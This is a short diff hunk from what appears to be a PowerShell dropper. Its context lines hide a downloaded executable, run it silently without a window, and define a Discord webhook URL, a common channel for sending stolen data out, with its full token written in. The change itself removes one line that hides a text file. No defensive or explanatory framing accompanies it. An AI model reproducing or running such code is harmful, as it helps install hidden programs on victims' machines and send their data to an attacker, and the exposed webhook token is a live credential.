@@ -13,7 +13,6 @@ if (Test-Path $downloadPath) {
     Set-ItemProperty -Path $downloadPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
     # Execute the downloaded executable
     Start-Process -FilePath $downloadPath -NoNewWindow
-    Set-ItemProperty -Path $textFilePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
     # Define the Discord webhook URL
     $webhookUrl = "https://discord.com/api/webhooks/1152705027098554478/HtWHmlFBKuYybSyaot6-5Sb_6VbxQNiTnPf9yDMru5OMcvv1UAp-HJnu_0UMTcactDOZ"
 
